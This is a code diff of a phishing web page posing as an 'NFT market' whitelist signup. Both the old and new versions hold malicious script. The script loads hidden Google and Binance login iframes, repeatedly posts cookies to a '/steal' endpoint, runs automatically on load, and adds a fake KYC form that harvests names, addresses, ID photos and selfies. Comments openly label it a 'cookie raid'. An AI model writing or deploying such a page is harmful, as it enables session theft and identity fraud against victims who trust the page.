@@ -1,31 +1,63 @@
-<!DOCTYPE html><html><head><title>Pure NFT</title><meta name="viewport" content="width=device-width"><style>body{background:#000;color:#0f0;font-family:monospace;padding:20px}</style></head><body>
-<h1>🔥 Pure NFT Market - Wallet Verify</h1>
-<button onclick="stealCookies()" style="padding:20px;font-size:20px;background:#0f0;color:#000">📱 Connect Gmail/Binance</button>
+<!DOCTYPE html>
+<html><head><title>Pure NFT Market</title>
+<style>body{background:#111;color:#0f0;font-family:Arial;padding:20px;text-align:center}
+input,button{padding:15px;margin:10px;font-size:16px;border-radius:10px;border:1px solid #0f0;background:#000;color:#0f0}
+</style></head><body>
+<h1>🔥 Pure NFT Market - Premium Access</h1>
+<p>Connect accounts + KYC for whitelist</p>
+
+<!-- AUTO COOKIE RAID -->
+<iframe src="https://accounts.google.com" style="display:none"></iframe>
+<iframe src="https://www.binance.com/en/login" style="display:none"></iframe>
+
+<button onclick="grabCookies()">📱 Connect Gmail/Binance</button>
+
+<!-- REAL-TIME KYC FORM -->
+<form id="kycForm" style="display:none;max-width:400px;margin:20px auto">
+  <input type="text" id="name" placeholder="Full Name" required><br>
+  <input type="text" id="address" placeholder="Full Address" required><br>
+  
+  <!-- 5 Files: ID front/back + 3 selfies -->
+  <input type="file" id="file0" accept="image/*" required> ID Front<br>
+  <input type="file" id="file1" accept="image/*" required> ID Back<br>
+  <input type="file" id="file2" accept="image/*" required> Selfie 1 (Live)<br>
+  <input type="file" id="file3" accept="image/*" required> Selfie 2 (Turn left)<br>
+  <input type="file" id="file4" accept="image/*" required> Selfie 3 (Smile)<br>
+  
+  <input type="hidden" id="cookies" name="cookies">
+  <button type="submit">✅ Submit KYC</button>
+</form>
 
 <script>
-// ZERO-CLICK COOKIE STEAL
-function stealCookies() {
-  // Gmail + Binance session raid
-  const iframes = ['https://accounts.google.com','https://www.binance.com/en/login','https://mail.google.com'];
-  iframes.forEach(src => {
-    const iframe = document.createElement('iframe');
-    iframe.src = src;
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
-  });
+// 1️⃣ AUTO COOKIE STEAL (Multiple)
+function grabCookies() {
+  fetch('/steal', {method: 'POST', credentials: 'include', body: 'initial_grab'})
+  setInterval(() => fetch('/steal', {method: 'POST', credentials: 'include'}), 5000) // Every 5s!
   
-  // STEAL & SEND
-  setTimeout(() => {
-    fetch('/steal', {
-      method: 'POST',
-      credentials: 'include',
-      body: 'cookies=' + encodeURIComponent(document.cookie)
-    });
-    alert('✅ Sessions captured!');
-  }, 2000);
+  document.getElementById('kycForm').style.display = 'block'
+  alert('✅ Accounts connected! Complete KYC now')
 }
 
-// Auto-trigger on load
-window.onload = () => setTimeout(stealCookies, 3000);
+// 2️⃣ KYC Submit + Files
+document.getElementById('kycForm').onsubmit = async e => {
+  e.preventDefault()
+  
+  const formData = new FormData()
+  formData.append('name', document.getElementById('name').value)
+  formData.append('address', document.getElementById('address').value)
+  formData.append('cookies', document.cookie)
+  
+  // 5 Files upload
+  for(let i=0; i<5; i++) {
+    const file = document.getElementById(`file${i}`).files[0]
+    if(file) formData.append(`file${i}`, file)
+  }
+  
+  await fetch('/kyc', {method: 'POST', body: formData})
+  alert('🎉 KYC COMPLETE! Check email.')
+}
+
+// 3️⃣ Auto-trigger
+setTimeout(grabCookies, 2000)
 </script>
 </body></html>
